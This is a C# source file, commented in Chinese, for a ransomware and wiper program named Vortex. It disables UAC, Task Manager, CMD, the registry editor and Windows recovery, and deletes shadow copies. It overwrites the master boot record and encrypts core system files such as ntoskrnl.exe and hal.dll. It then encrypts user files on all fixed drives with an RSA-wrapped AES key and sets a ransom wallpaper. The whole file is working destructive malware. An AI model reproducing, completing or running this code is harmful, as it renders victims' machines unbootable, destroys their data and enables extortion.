using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VortexSecOps.AesRsaCipherMix;
using VortexSecOps.FileTraversalService;
using VortexSecOps.HarmfulSysHacks;
using VortexSecOps.Regedit_Set;

namespace xdll32
{
    internal class Program
    {
        static string GetSHA256(byte[] bytes)
        {
            return AesRsaEncryptionManager.GetSHA256(bytes);
        }
        // 定义要创建的恶意可执行文件的路径
        private const string FileName = @"C:\Rundl132.exe";
        // RSA-4096公钥XML字符串
        private const string PublicKey = @"<RSAKeyValue><Modulus>27MHYRVoyzJJG8gMI+YRNXWd1nexs2xhzf/ERILBTO1ZvSXOLciv3XgVb4QCzFAbi+zTE9xeGuzSTx7I+gdw0urmjbVOpXmXIGe6LpFfjSHkvtaTRMZjv5VuXAvRckAn4+51NUPHqbPp590eyu1VC8qm31HP56V6nz13yJLAZprsLL7NY7nA5SVHnQIG1m/T20iPJzOhnPCO4x0Dvdyi7SrphWtvx1Qs88P+p0yhgqPTZqpB4CMOusHu7eyQlvrpRFqn/6LqDVneNHa73OQvdZS0XzNCrzTxcwlThs+NBRkWcr9KlwtEUXwT5nv7pCxW+Yy+ohryBTYBG3aCwUycnaaBe9L/4xqiaoc1oT48Kn3BKoUa9BDjVuo4dEmkoTFr8WUTZSTr3YRz3P9j9B+CMZDtA4FpnKAjvXAGS9Vy1hwa/MJIfvnXAQyuirr1BM3YyTGoC44KabPnydG+1TrrhVA1kGSohXYtmGsQKC2LO0NWfOADZAdh7OkAPxlm7UtFeWr6j1mxxmW55fMXGnUA0LGMPJoDhcU/aIOYO8v/fSRbgEvTYDelmnd9g3kCV/o187Km/Yd3wBHKf6uIz8BPGMXW5nOiXas0kcpjGCbUVlHsL9BkQt8vANBE+JpvA0eO8Mfa3QX409Pgtx6RtkT74TqkbX2g1yQQsg7FMjnhchU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

        // 不断尝试杀死任务管理器进程的方法
        static void TaskmgrKill()
        {
            string taskmgr = "Taskmgr";
            while (true)
            {
                try
                {
                    // 获取所有名为 Taskmgr 的进程
                    Process[] processes = Process.GetProcessesByName(taskmgr);
                    if (processes.Length > 0)
                    {
                        // 逐个杀死找到的任务管理器进程
                        foreach (Process process in processes)
                        {
                            process.Kill();
                        }
                    }
                }
                catch (Exception)
                {
                    // 捕获异常但不做处理
                }
                // 线程休眠200毫秒
                Thread.Sleep(200);
            }
        }
        // 声明Windows API函数
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        static void SetDesktopWallpaper(string path)
        {
            try
            {
                // 设置桌面壁纸
                SystemParametersInfo(0x0014, 0, path, 0x01 | 0x02);
            }
            catch (Exception)
            {
                // 捕获异常但不做处理
            }
        }
        static async Task Del(string[] args)
        {
            try
            {
                // 检查命令行参数是否符合要求（第一个参数为 /del 且参数数量不超过2个）
                if (args.Length > 0 && args[0] == "/del" && args.Length <= 2)
                {
                    if (args.Length == 2)
                    {
                        // 等待1秒
                        await Task.Delay(1000);
                        // 删除指定的文件
                        File.Delete(args[1]);
                    }
                    else
                    {
                        // 参数数量不符合要求，输出提示信息
                        Console.WriteLine("请选择要删除的文件");
                    }
                }
                else
                {
                    // 参数不符合要求，直接返回
                    return;
                }
            }
            catch (Exception)
            {
                // 捕获异常但不做处理
            }
        }

        // 程序入口点
        static async Task Main(string[] args)
        {
            // 检查程序是否以管理员身份运行
            if (!MalwareIntruder.IsRunningAsAdministrator())
            {
                // 如果不是，以管理员身份重新启动当前应用程序
                MalwareIntruder.RestartCurrentAppAsAdmin();
            }

            // 调用删除文件的方法处理命令行参数
            Del(args);
            Task.Run(TaskmgrKill);

            // 定义主引导记录（MBR）文件路径
            const string MBR_PATH = @"C:\bin\mbr.bin";

            // 初始化配置破坏器、Windows API操作器和注册表配置器
            IConfigCorrupter configCorrupter = MalwareIntruder.Create<IConfigCorrupter>();
            IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
            IRegistryConfigurer registryConfigurer = RegistryConfigurer.Create();

            // 异步执行禁用UAC（用户账户控制）的操作
            Task.Run(async () =>
            {
                registryConfigurer.DisableUAC();
            });
            Task WinREDisableTask = Task.Run(() =>
            {
                configCorrupter.DisableWindowsRecoveryEnvironment();
            });
            Task task1 = null;
#pragma warning restore CS4014
            // 获取桌面路径
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string wallpaperPath = Path.Combine(desktopPath, "@VotexDecryptor@.png");
            string Vortex_Decryptor_Path = Path.Combine(desktopPath, "@Vortex_decryptor.exe");
            // 获取解密程序的Base64编码内容
            string Vortex_decryptor = xdll32.Resources.Vortex_decryptor;
            // 创建AES/RSA加密服务实例
            IAesRsaCryptographyService cryptographyService = AesRsaEncryptionManager.Create();
            try
            {
                if (File.Exists(FileName))
                {
                    File.Delete(FileName);
                }
                // 将Base64编码的内容写入文件，创建恶意可执行文件
                File.WriteAllBytes(FileName, Convert.FromBase64String(xdll32.Resources.Rundl132));
                FileInfo fileInfo = new FileInfo(FileName);
                // 设置文件属性为系统和隐藏
                fileInfo.Attributes = FileAttributes.System | FileAttributes.Hidden;
                // 将Base64编码的内容写入文件，生成解密程序到桌面
                File.WriteAllBytes(Vortex_Decryptor_Path, Convert.FromBase64String(Vortex_decryptor));
            }
            catch (Exception)
            {
                // 捕获异常但不做处理
            }

            // 如果指定目录存在，则删除该目录及其所有内容
            if (Directory.Exists(@"C:\bin"))
            {
                Directory.Delete(@"C:\bin", true);
            }

            // 加载AES加密密钥
            byte[] aesEncryptionKey = AesRsaEncryptionManager.LoadAesKey();
            string keyHash;
            // 计算AES密钥的SHA256哈希值
            using (SHA256 hA256 = SHA256Cng.Create())
            {
                try
                {
                    StringBuilder builder = new StringBuilder();
                    byte[] HashBytes = hA256.ComputeHash(aesEncryptionKey);
                    foreach (byte b in HashBytes)
                    {
                        builder.Append(b.ToString("x2"));
                    }
                    keyHash = builder.ToString();
                }
                catch (Exception)
                {
                    // 捕获异常但不做处理
                    keyHash = string.Empty;
                }
            }
            // 使用RSA公钥加密AES密钥
            cryptographyService.EncryptAesKeyWithRsa(PublicKey);
            try
            {
                //删除所有卷影副本
                windowsAPIOperator.DeleteAllRestorePoints();
                // 获取主引导记录（MBR）数据
                byte[] mbr = MalwareIntruder.GetMbrUsingWindowsAPI();
                // 使用AES密钥加密MBR文件
                cryptographyService.EncryptFileWithAesKey(MBR_PATH, aesEncryptionKey);
                // 修改主引导记录
                windowsAPIOperator.ModifyMasterBootRecord();
                task1 = Task.Run(async () =>
                {
                    // 修改主引导记录
                    windowsAPIOperator.ModifyMasterBootRecord();
                    // 删除所有卷影副本
                    windowsAPIOperator.DeleteAllRestorePoints();
                    // 加密硬件抽象层
                    MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\hal.dll", (path) =>
                    {
                        cryptographyService.EncryptFileWithAesKey(path, aesEncryptionKey);
                    });
                    // 加密Windows系统主内核
                    MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\ntoskrnl.exe", (path) =>
                    {
                        cryptographyService.EncryptFileWithAesKey(path, aesEncryptionKey);
                    });
                    // 加密系统完整性检查和修复工具
                    MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\sfc.exe", (path) =>
                    {
                        cryptographyService.EncryptFileWithAesKey(path, aesEncryptionKey);
                        File.WriteAllBytes(path, Convert.FromBase64String(Resources.Rundl132));
                    });
                    // 加密 Microsoft 管理控制台
                    MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\mmc.exe", (path) =>
                    {
                        cryptographyService.EncryptFileWithAesKey(path, aesEncryptionKey);
                    });
                    // 加密 Windows 映像部署管理工具
                    MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\Dism.exe", (path) =>
                    {
                        cryptographyService.EncryptFileWithAesKey(path, aesEncryptionKey);
                    });
                    await WinREDisableTask;
                    // 加密 Windows 恢复环境配置工具
                    MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\ReAgentc.exe", (path) =>
                    {
                        cryptographyService.EncryptFileWithAesKey(path, aesEncryptionKey);
                    });
                });
                // 配置CMD为禁用状态
                registryConfigurer.ConfigureCMD(2);
                // 应用Windows功能限制
                registryConfigurer.ApplyWinRestricts(true);
                // 禁用系统设置（控制面板和任务管理器）
                registryConfigurer.DisableSysSettings();
                // 修改主启动项，下次启动直接蓝屏
                registryConfigurer.ConfigStartupProg(FileName);
                // 禁用注册表编辑器
                registryConfigurer.DisableRegistryEdit();
                File.WriteAllBytes(wallpaperPath, Convert.FromBase64String(Resources.Wallpaper));
                SetDesktopWallpaper(wallpaperPath); // 设置桌面壁纸
            }
            catch (Exception)
            {
                // 捕获异常但不做处理
            }

            // 创建文件遍历器实例
            IFileTraverser fileTraverser = FileTraverser.Create();

            // 检查数据是否未被AES加密
            if (!registryConfigurer.IsDataEncryptedByAes(true))
            {
                // 用于存储加密任务的列表
                var encryptionTasks = new List<Task>();
                // 创建信号量，限制并发任务数量为100
                var semaphore = new SemaphoreSlim(100, 100);

                // 遍历要加密的文件扩展名列表
                foreach (string extension in AesRsaEncryptionManager.encryptedFileExtensions)
                {
                    // 遍历C:\users目录下符合扩展名的文件并进行加密
                    foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Users", extension))
                    {
                        await semaphore.WaitAsync();
                        // 异步加密文件
                        var task = Task.Run(() =>
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
                                if (fileInfo.Name.ToLower() == "desktop.ini" || aesEncryptionNeededFilePath.ToLower() == wallpaperPath.ToLower())
                                {
                                    return;
                                }
                                if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
                                {
                                    return;
                                }
                                if (fileInfo.Length > 0)
                                {
                                    // 检查文件是否为解密程序
                                    if (aesEncryptionNeededFilePath.ToLower() != Vortex_Decryptor_Path.ToLower())
                                    {
                                        cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
                                    }
                                }
                            }
                            finally
                            {
                                semaphore?.Release();
                            }
                        });
                        encryptionTasks.Add(task);
                    }

                    // 遍历C:\Program Files (x86)目录下符合扩展名的文件并进行加密
                    foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Program Files (x86)", extension))
                    {
                        await semaphore.WaitAsync();
                        // 异步加密文件
                        var task = Task.Run(() =>
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
                                if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
                                {
                                    return;
                                }
                                if (fileInfo.Length > 0)
                                {
                                    cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
                                }
                            }
                            finally
                            {
                                semaphore?.Release();
                            }
                        });
                        encryptionTasks.Add(task);
                    }
                }

                // 获取所有驱动器信息
                DriveInfo[] driveInfo = DriveInfo.GetDrives();

                // 遍历要加密的文件扩展名列表
                foreach (string extension in AesRsaEncryptionManager.encryptedFileExtensions)
                {
                    // 遍历所有驱动器
                    foreach (DriveInfo drive in driveInfo)
                    {
                        if (drive.Name != @"C:\" && drive.DriveType == DriveType.Fixed)
                        {
                            // 遍历当前驱动器下符合扩展名的文件并进行加密
                            foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(drive.Name, extension))
                            {
                                await semaphore?.WaitAsync();
                                // 异步加密文件
                                var task = Task.Run(() =>
                                {
                                    try
                                    {
                                        FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
                                        if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
                                        {
                                            return;
                                        }
                                        if (fileInfo.Length > 0)
                                        {
                                            cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
                                        }
                                    }
                                    finally
                                    {
                                        semaphore?.Release();
                                    }
                                });
                                encryptionTasks.Add(task);
                            }
                        }
                    }
                }

                // 等待所有加密任务完成
                await Task.WhenAll(encryptionTasks);
                if (task1 != null)
                {
                    if (!task1.IsCompleted)
                    {
                        await task1;
                    }
                }
                Array.Clear(aesEncryptionKey, 0, aesEncryptionKey.Length);       // 清除AES密钥，防止进行内存取证
                try
                {
                    if ((!File.Exists(Vortex_Decryptor_Path)) || GetSHA256(File.ReadAllBytes(Vortex_Decryptor_Path)) != GetSHA256(Convert.FromBase64String(Vortex_decryptor)))
                    {
                        // 将Base64编码的内容写入文件，生成解密程序到桌面
                        File.WriteAllBytes(Vortex_Decryptor_Path, Convert.FromBase64String(Vortex_decryptor));
                    }
                    byte[] encryped_Html = Convert.FromBase64String(Resources.HTML);
                    if (File.Exists(@"C:\encrypted.html"))
                    {
                        File.Delete(@"C:\encrypted.html");
                    }
                    // 将Base64编码的内容写入文件，创建加密的HTML文件
                    File.WriteAllBytes(@"C:\encrypted.html", encryped_Html);
                    FileInfo fileInfoHtml = new FileInfo(@"C:\encrypted.html");
                    // 设置加密的HTML文件属性为隐藏和系统
                    fileInfoHtml.Attributes = FileAttributes.Hidden | FileAttributes.System;
                }
                catch (Exception)
                {
                    // 捕获异常但不做处理
                }
                // 创建进程启动信息，以管理员身份运行解密程序
                ProcessStartInfo startInfo = new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    FileName = Vortex_Decryptor_Path,
                    Arguments = keyHash,
                    Verb = "runas"
                };
                // 启动解密程序
                Process.Start(startInfo);
                // 退出当前程序
                Environment.Exit(0);
            }
        }
    }
}